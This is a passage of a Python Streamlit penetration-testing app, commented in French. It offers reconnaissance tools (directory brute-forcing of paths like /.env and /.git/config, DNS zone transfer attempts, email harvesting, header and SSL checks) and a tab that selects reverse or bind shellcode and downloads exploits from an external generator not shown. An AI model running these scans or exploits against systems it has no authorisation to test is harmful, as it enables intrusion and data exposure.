                file_name=f"pentest_report_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                mime="text/plain",
            )

# Après le bouton d'analyse existant
# Bouton de scan de sous-domaines avec une clé unique
if st.button(texts[current_lang]["subdomain_scan"], key="subdomain_scan_button"):
    if target:
        with st.spinner(texts[current_lang]["loading_subdomains"]):
            subdomain_results = enumerate_subdomains(target)
            st.subheader("🌐 " + texts[current_lang]["subdomain_results"])
            st.code(subdomain_results, language="text")

# Options avancées dans un expander
with st.expander(texts[current_lang]["advanced"]):
    # Création d'onglets pour organiser les fonctionnalités avancées
    tab1, tab2, tab3, tab4 = st.tabs(["🔧 Shellcode", "🌐 Web Analysis", "🔍 Network", "🛡️ OSINT"])
    
    # Tab 1: Options existantes pour Shellcode
    with tab1:
        col1, col2 = st.columns(2)
        with col1:
            # Sélection de l'architecture
            selected_arch = st.selectbox(
                texts[current_lang]["architecture"],
                ['amd64', 'i386', 'arm', 'aarch64'],
            )
            # Mise à jour du contexte après la sélection
            if PWNCTX:
                try:
                    PWNCTX.arch = selected_arch
                except Exception as e:
                    st.error(f"❌ Erreur lors du changement d'architecture: {str(e)}")
            shellcode_type = st.selectbox(
                texts[current_lang]["shellcode"],
                ['shell_bind_tcp', 'shell_reverse_tcp', 'execve']
            )
        with col2:
            custom_port = st.number_input(texts[current_lang]["port"], min_value=1, max_value=65535, value=4444)
            # Création de deux colonnes pour le payload
            payload_col1, payload_col2 = st.columns([3, 1])
            # Définition du dictionnaire de payloads avant le selectbox
            with payload_col2:
                preset_payload = st.selectbox(
                    texts[current_lang]["presets"],
                    list(payload_dict.keys())
                )
                # Affichage de la description
                if preset_payload != "Sélectionner...":
                    st.info(f"📝 {payload_dict[preset_payload]['description']}")
            with payload_col1:
                # Utilisation de st.text_area avec value pré-remplie
                custom_payload = st.text_area(
                    texts[current_lang]["payload"],
                    value=payload_dict[preset_payload]["code"],
                    key="custom_payload"
                )
    
    # Tab 2: Web Analysis - Nouvelles fonctionnalités
    with tab2:
        st.subheader("🔍 Web Technology Scanner")
        web_target = st.text_input("URL to analyze", placeholder="https://example.com")
        col1, col2 = st.columns(2)
        with col1:
            if st.button("🔎 Detect Technologies"):
                with st.spinner("Detecting technologies..."):
                    if web_target:
                        st.info("Scanning web technologies...")
                        tech_results = detect_web_technologies(web_target)
                        st.json(tech_results)
        with col2:
            if st.button("🔍 Find Hidden Directories"):
                with st.spinner("Scanning for hidden directories..."):
                    if web_target:
                        dir_results = directory_bruteforce(web_target)
                        st.code(dir_results, language="text")
        
        # HTTP Headers Analysis
        st.subheader("🔒 HTTP Headers Analysis")
        if st.button("Analyze HTTP Headers"):
            if web_target:
                with st.spinner("Analyzing HTTP headers..."):
                    headers_analysis = analyze_http_headers(web_target)
                    st.code(headers_analysis, language="text")

    # Tab 3: Network - Nouvelles fonctionnalités
    with tab3:
        st.subheader("🌐 DNS Enumeration")
        dns_target = st.text_input("Domain for DNS enumeration", placeholder="example.com")
        if st.button("🔍 Enumerate DNS Records"):
            with st.spinner("Analyzing DNS records..."):
                if dns_target:
                    dns_results = enumerate_dns_records(dns_target)
                    st.code(dns_results, language="text")
        
        st.subheader("🔒 SSL/TLS Analysis")
        ssl_target = st.text_input("Domain for SSL analysis", placeholder="example.com")
        if st.button("🔒 Analyze SSL/TLS"):
            with st.spinner("Analyzing SSL/TLS configuration..."):
                if ssl_target:
                    ssl_results = analyze_ssl_tls(ssl_target)
                    st.code(ssl_results, language="text")

    # Tab 4: OSINT - Nouvelles fonctionnalités
    with tab4:
        st.subheader("🔍 Email Finder")
        osint_target = st.text_input("Domain for OSINT", placeholder="company.com")
        if st.button("🔍 Find Emails"):
            with st.spinner("Searching for email addresses..."):
                if osint_target:
                    email_results = find_emails(osint_target)
                    st.code(email_results, language="text")
        
        st.subheader("🌐 Metadata Extractor")
        uploaded_file = st.file_uploader("Upload file to extract metadata", type=['pdf', 'docx', 'jpg', 'png'])
        if uploaded_file is not None:
            if st.button("Extract Metadata"):
                with st.spinner("Extracting metadata..."):
                    metadata = extract_metadata(uploaded_file)
                    st.json(metadata)

# Ajoutons les nouvelles fonctions pour les fonctionnalités avancées
def detect_web_technologies(url):
    """Détecte les technologies utilisées sur un site web"""
    try:
        import requests
        from bs4 import BeautifulSoup
        import re
        
        # Vérifications de base
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Récupération de la page
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Initialisation des résultats
        tech_stack = {
            "server": response.headers.get('Server', 'Unknown'),
            "technologies": [],
            "javascript_libraries": [],
            "cms": "Unknown",
            "analytics": [],
            "headers": dict(response.headers)
        }
        
        # Détection des frameworks/bibliothèques JS
        js_patterns = {
            "jQuery": r'jquery[.-](\d+\.\d+\.\d+)(?:\.min)?\.js',
            "React": r'react(?:-dom|-with-addons)?[.-](\d+\.\d+\.\d+)(?:\.min)?\.js',
            "Angular": r'angular[.-](\d+\.\d+\.\d+)(?:\.min)?\.js',
            "Vue.js": r'vue[.-](\d+\.\d+\.\d+)(?:\.min)?\.js',
            "Bootstrap": r'bootstrap[.-](\d+\.\d+\.\d+)(?:\.min)?\.js'
        }
        
        for script in soup.find_all('script', src=True):
            script_src = script['src']
            for tech, pattern in js_patterns.items():
                if re.search(pattern, script_src):
                    tech_stack["javascript_libraries"].append(tech)
        
        # Détection de CMS
        cms_patterns = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Joomla": ["joomla", "com_content"],
            "Drupal": ["drupal.js", "drupal.min.js"],
            "Magento": ["mage", "magento"],
            "Shopify": ["shopify", "myshopify.com"]
        }
        
        page_text = str(soup).lower()
        for cms, patterns in cms_patterns.items():
            for pattern in patterns:
                if pattern.lower() in page_text:
                    tech_stack["cms"] = cms
                    break
        
        # Détection d'outils d'analyse
        analytics_patterns = {
            "Google Analytics": ["google-analytics.com", "ga.js", "analytics.js", "gtag"],
            "Hotjar": ["hotjar", "hj.js"],
            "Matomo/Piwik": ["matomo", "piwik"],
            "Mixpanel": ["mixpanel"],
            "Adobe Analytics": ["omniture", "adobe analytics"]
        }
        
        for analytics, patterns in analytics_patterns.items():
            for pattern in patterns:
                if pattern.lower() in page_text:
                    tech_stack["analytics"].append(analytics)
                    break
        
        # Autres technologies
        if 'X-Powered-By' in response.headers:
            tech_stack["technologies"].append(response.headers['X-Powered-By'])
        
        if soup.select('meta[name="generator"]'):
            generator = soup.select_one('meta[name="generator"]')['content']
            tech_stack["technologies"].append(f"Generator: {generator}")
        
        return tech_stack
        
    except Exception as e:
        return {"error": str(e)}

def directory_bruteforce(url):
    """Recherche des répertoires et fichiers courants sur un site web"""
    try:
        import requests
        import concurrent.futures
        
        # Liste commune de chemins à tester
        common_paths = [
            "/admin", "/login", "/wp-admin", "/dashboard", "/admin/login", 
            "/administrator", "/wp-login.php", "/user", "/cp", "/cpanel", 
            "/robots.txt", "/sitemap.xml", "/backup", "/phpmyadmin", 
            "/.env", "/.git/config", "/api", "/api/v1", "/console", 
            "/web.config", "/phpinfo.php", "/info.php", "/.htaccess",
            "/uploads", "/images", "/img", "/css", "/js", "/assets",
            "/config", "/database", "/db", "/logs", "/old", "/new",
            "/test", "/dev", "/staging"
        ]
        
        # Normaliser l'URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Supprimer le slash final si présent
        if url.endswith('/'):
            url = url[:-1]
        
        results = []
        results.append(f"🔍 Directory Bruteforce Results for: {url}\n")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        def check_path(path):
            try:
                full_url = f"{url}{path}"
                response = requests.head(full_url, headers=headers, timeout=5, allow_redirects=True)
                
                if response.status_code < 400:
                    return f"✅ {response.status_code} - {full_url}"
                return None
            except Exception:
                return None
        
        # Utiliser ThreadPoolExecutor pour accélérer les requêtes
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_path = {executor.submit(check_path, path): path for path in common_paths}
            for future in concurrent.futures.as_completed(future_to_path):
                result = future.result()
                if result:
                    results.append(result)
        
        if len(results) == 1:
            results.append("❌ No accessible directories or files found.")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error during directory bruteforce: {str(e)}"

def analyze_http_headers(url):
    """Analyse des en-têtes HTTP pour détecter des problèmes de sécurité"""
    try:
        import requests
        
        # Normaliser l'URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        results = []
        results.append(f"🔍 HTTP Headers Analysis for: {url}\n")
        results.append("==== Security Headers ====")
        
        # Headers de sécurité à vérifier
        security_headers = {
            'Strict-Transport-Security': 'Missing HSTS header. This header tells browsers to only use HTTPS.',
            'Content-Security-Policy': 'Missing CSP header. This helps prevent XSS attacks.',
            'X-Frame-Options': 'Missing X-Frame-Options header. This prevents clickjacking attacks.',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header. This prevents MIME-type sniffing.',
            'Referrer-Policy': 'Missing Referrer-Policy header. Controls how much referrer information is included with requests.',
            'X-XSS-Protection': 'Missing X-XSS-Protection header. This header can help prevent XSS in older browsers.',
            'Permissions-Policy': 'Missing Permissions-Policy header. This controls which browser features can be used.'
        }
        
        response_headers = response.headers
        
        for header, message in security_headers.items():
            if header in response_headers:
                results.append(f"✅ {header}: {response_headers[header]}")
            else:
                results.append(f"❌ {message}")
        
        # Informations sur le serveur (potentiellement sensibles)
        results.append("\n==== Server Information ====")
        if 'Server' in response_headers:
            results.append(f"⚠️ Server: {response_headers['Server']} - Consider hiding server information")
        if 'X-Powered-By' in response_headers:
            results.append(f"⚠️ X-Powered-By: {response_headers['X-Powered-By']} - Consider hiding technology information")
        
        # Cookies
        results.append("\n==== Cookies Analysis ====")
        if response.cookies:
            for cookie in response.cookies:
                cookie_info = []
                if not cookie.secure:
                    cookie_info.append("not secure")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    cookie_info.append("not HttpOnly")
                if not cookie.has_nonstandard_attr('SameSite'):
                    cookie_info.append("no SameSite")
                
                if cookie_info:
                    results.append(f"⚠️ Cookie '{cookie.name}': {', '.join(cookie_info)}")
                else:
                    results.append(f"✅ Cookie '{cookie.name}': properly secured")
        else:
            results.append("No cookies found")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error analyzing HTTP headers: {str(e)}"

def enumerate_dns_records(domain):
    """Analyse des enregistrements DNS pour un domaine"""
    try:
        # Vérifier d'abord si le module dns est installé
        try:
            import dns.resolver
        except ImportError:
            return """❌ Module 'dns' non installé. 
            
Pour l'installer, exécutez :
```
pip install dnspython
```

Ce module est nécessaire pour l'énumération DNS."""
        
        import socket
        
        results = []
        results.append(f"🔍 DNS Enumeration Results for: {domain}\n")
        
        # Types d'enregistrements DNS à vérifier
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 5
        
        for record_type in record_types:
            try:
                answers = resolver.resolve(domain, record_type)
                results.append(f"=== {record_type} Records ===")
                for answer in answers:
                    results.append(f"✅ {answer}")
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                results.append(f"❌ No {record_type} records found")
            except Exception as e:
                results.append(f"❌ Error querying {record_type} records: {str(e)}")
            
            results.append("")  # Empty line between record types
        
        # Zone Transfer attempt (rarely works but worth checking)
        results.append("=== Zone Transfer Attempt ===")
        try:
            ns_records = resolver.resolve(domain, 'NS')
            nameservers = [str(ns) for ns in ns_records]
            for ns in nameservers[:2]:  # Try just the first two nameservers
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns, domain, timeout=5))
                    results.append(f"⚠️ Zone transfer successful from {ns}! This is a security risk.")
                    for name, node in zone.nodes.items():
                        rdatasets = node.rdatasets
                        for rdataset in rdatasets:
                            results.append(f"  {name} {rdataset}")
                except:
                    results.append(f"✅ Zone transfer refused from {ns} (this is good)")
        except:
            results.append("❌ Could not test for zone transfers")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error during DNS enumeration: {str(e)}"

def analyze_ssl_tls(domain):
    """Analyse de la configuration SSL/TLS d'un domaine"""
    try:
        import socket
        import ssl
        import datetime
        
        results = []
        results.append(f"🔍 SSL/TLS Analysis for: {domain}\n")
        
        context = ssl.create_default_context()
        
        try:
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Version SSL/TLS
                    results.append(f"SSL/TLS Version: {ssock.version()}")
                    
                    # Cipher suite
                    cipher = ssock.cipher()
                    results.append(f"Cipher Suite: {cipher[0]}")
                    results.append(f"SSL/TLS Protocol: {cipher[1]}")
                    results.append(f"Bits: {cipher[2]}")
                    
                    # Certificate information
                    results.append("\n=== Certificate Information ===")
                    
                    # Issuer
                    issuer = dict(x[0] for x in cert['issuer'])
                    results.append(f"Issuer: {issuer.get('organizationName', 'Unknown')}")
                    
                    # Subject
                    subject = dict(x[0] for x in cert['subject'])
                    results.append(f"Organization: {subject.get('organizationName', 'Unknown')}")
                    results.append(f"Common Name: {subject.get('commonName', 'Unknown')}")
                    
                    # Validity dates
                    not_before = datetime.datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
                    not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    now = datetime.datetime.now()
                    
                    results.append(f"Valid From: {not_before.strftime('%Y-%m-%d')}")
                    results.append(f"Valid Until: {not_after.strftime('%Y-%m-%d')}")
                    
                    # Certificate expiration check
                    days_left = (not_after - now).days
                    if days_left < 0:
                        results.append(f"❌ Certificate EXPIRED {abs(days_left)} days ago!")
                    elif days_left < 30:
                        results.append(f"⚠️ Certificate expires soon! Only {days_left} days left.")
                    else:
                        results.append(f"✅ Certificate valid for {days_left} more days")
                    
                    # SAN check
                    if 'subjectAltName' in cert:
                        results.append("\nSubject Alternative Names:")
                        for san_type, san_value in cert['subjectAltName']:
                            results.append(f"  {san_type}: {san_value}")
        
        except ssl.SSLError as e:
            results.append(f"❌ SSL Error: {str(e)}")
        except socket.error as e:
            results.append(f"❌ Socket Error: {str(e)}")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error during SSL/TLS analysis: {str(e)}"

def find_emails(domain):
    """Recherche d'adresses e-mail associées à un domaine sur le web"""
    try:
        import requests
        from bs4 import BeautifulSoup
        import re
        
        results = []
        results.append(f"🔍 Email Finder Results for: {domain}\n")
        
        # Regex for email matching
        email_pattern = r'[a-zA-Z0-9._%+-]+@' + re.escape(domain)
        
        # Search for emails on the main website
        try:
            url = f"https://{domain}"
            response = requests.get(url, timeout=10)
            emails_found = set(re.findall(email_pattern, response.text))
            
            if emails_found:
                results.append("=== Emails found on main website ===")
                for email in emails_found:
                    results.append(f"✉️ {email}")
            else:
                results.append("❌ No emails found on main website")
        except Exception as e:
            results.append(f"❌ Error scanning website: {str(e)}")
        
        # Search for emails on the contact page
        try:
            contact_url = f"https://{domain}/contact"
            response = requests.get(contact_url, timeout=10)
            emails_found = set(re.findall(email_pattern, response.text))
            
            if emails_found:
                results.append("\n=== Emails found on contact page ===")
                for email in emails_found:
                    results.append(f"✉️ {email}")
        except:
            # Contact page might not exist, ignore error
            pass
            
        # Check common email patterns
        results.append("\n=== Common email patterns to try ===")
        common_names = ["info", "contact", "admin", "support", "sales", "hello", "webmaster", "help"]
        for name in common_names:
            results.append(f"👤 {name}@{domain}")
        
        return "\n".join(results)
        
    except Exception as e:
        return f"❌ Error during email search: {str(e)}"

def extract_metadata(uploaded_file):
    """Extrait les métadonnées d'un fichier"""
    try:
        # Récupérer le type de fichier
        file_type = uploaded_file.type
        file_name = uploaded_file.name
        file_content = uploaded_file.read()
        
        metadata = {
            "filename": file_name,
            "size": len(file_content),
            "type": file_type,
            "extracted_metadata": {}
        }
        
        # Traitement selon le type de fichier
        if file_type.startswith("image/"):
            # Images
            from PIL import Image
            import io
            from PIL.ExifTags import TAGS
            
            img = Image.open(io.BytesIO(file_content))
            exif_data = img._getexif()
            
            if exif_data:
                for tag_id, value in exif_data.items():
                    tag = TAGS.get(tag_id, tag_id)
                    if isinstance(value, bytes):
                        try:
                            value = value.decode('utf-8', 'replace')
                        except:
                            value = str(value)
                    metadata["extracted_metadata"][tag] = str(value)
            
            # Dimensions de l'image
            metadata["extracted_metadata"]["dimensions"] = f"{img.width}x{img.height}"
            metadata["extracted_metadata"]["format"] = img.format
            metadata["extracted_metadata"]["mode"] = img.mode
            
        elif file_type == "application/pdf":
            # PDF
            import PyPDF2
            import io
            
            pdf_reader = PyPDF2.PdfReader(io.BytesIO(file_content))
            info = pdf_reader.metadata
            
            if info:
                for key, value in info.items():
                    metadata["extracted_metadata"][key[1:] if key.startswith('/') else key] = str(value)
            
            metadata["extracted_metadata"]["pages"] = len(pdf_reader.pages)
            
        elif file_type in ["application/vnd.openxmlformats-officedocument.wordprocessingml.document", "application/msword"]:
            # Word documents
            import docx
            import io
            
            doc = docx.Document(io.BytesIO(file_content))
            
            metadata["extracted_metadata"]["paragraphs"] = len(doc.paragraphs)
            metadata["extracted_metadata"]["sections"] = len(doc.sections)
            
            # Propriétés du document
            if hasattr(doc, 'core_properties'):
                props = doc.core_properties
                metadata["extracted_metadata"]["author"] = str(props.author) if props.author else "Unknown"
                metadata["extracted_metadata"]["created"] = str(props.created) if props.created else "Unknown"
                metadata["extracted_metadata"]["modified"] = str(props.modified) if props.modified else "Unknown"
                metadata["extracted_metadata"]["title"] = str(props.title) if props.title else "Unknown"
                
        return metadata
        
    except Exception as e:
        return {"error": str(e), "filename": uploaded_file.name if uploaded_file else "Unknown"}

def validate_input(target, port, shellcode_type):
    """Valide les paramètres d'entrée"""
    if not target:
        st.error("❌ La cible est requise")
        return False
    if not 1 <= port <= 65535:
        st.error("❌ Le port doit être entre 1 et 65535")
        return False
    if shellcode_type not in ['shell_bind_tcp', 'shell_reverse_tcp', 'execve']:
        st.error("❌ Type de shellcode non valide")
        return False
    return True

# Remplacer les fonctions create_exploit_file et generate_exploit par une importation du générateur externe
from exploit_generator import generator

# Modifier le bouton de génération
if st.button(texts[current_lang]["generate"]):
    if validate_input(target, custom_port, shellcode_type):
        try:
            with st.spinner("Génération de l'exploit..."):
                if not generator.is_available():
                    st.error(f"❌ pwntools n'est pas initialisé. Erreur: {generator.get_error()}")
                    st.info("💡 Pour installer pwntools:\n```bash\npip install pwntools\n```")
                    st.info("Si pwntools est déjà installé, essayez de redémarrer l'application.")
                else:
                    exploit = generator.generate_exploit_code(
                        shellcode_type=shellcode_type,
                        target=target,
                        custom_port=custom_port,
                        selected_arch=selected_arch
                    )
                    
                    if exploit.startswith("#!/usr/bin/python3\n#"):
                        st.error(exploit.split('\n')[1].strip('# '))
                    else:
                        st.code(exploit, language="python")
                        st.download_button(
                            label="📥 Télécharger l'exploit",
                            data=exploit,
                            file_name=f"exploit_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py",
                            mime="text/plain",
                        )
        except Exception as e:
            st.error(f"❌ Erreur de génération: {str(e)}")
            import traceback
            st.code(traceback.format_exc(), language="python")

# Affichage des informations de débogage
if PWNCTX and PWNCTX.log_level == 'debug':
    with st.expander("🔍 Informations de Débogage"):
        st.code(f"""
Architecture: {PWNCTX.arch}
OS: {PWNCTX.os}
""", language="text")

# Conseils et avertissements
st.markdown("---")  # Séparateur
st.markdown(texts[current_lang]["warning"])

# Explications sur pwntools
st.markdown("## Utilisation de pwntools")
st.markdown("Cet outil utilise la bibliothèque `pwntools` pour interagir avec des services réseau.")
st.markdown("Voici quelques exemples de commandes `pwntools` que vous pouvez utiliser dans la zone d'interaction :")
st.markdown(
    """
    ```python
    r.recvline()  # Réception d'une ligne
    r.sendline(b"ls")  # Envoi d'une commande
    r.recvall()  # Réception de toutes les données
    r.interactive() # shell interactif
    ```
    """
)
st.markdown(
    "N'oubliez pas que vous devez utiliser [r](http://_vscodecontentref_/2) pour faire référence à la connexion établie avec la cible."
)

# Remplacer complètement cette partie
if PWNCTX:
    st.success("✅ pwntools est correctement initialisé et prêt à l'emploi!")
# Ne rien afficher si déjà prêt
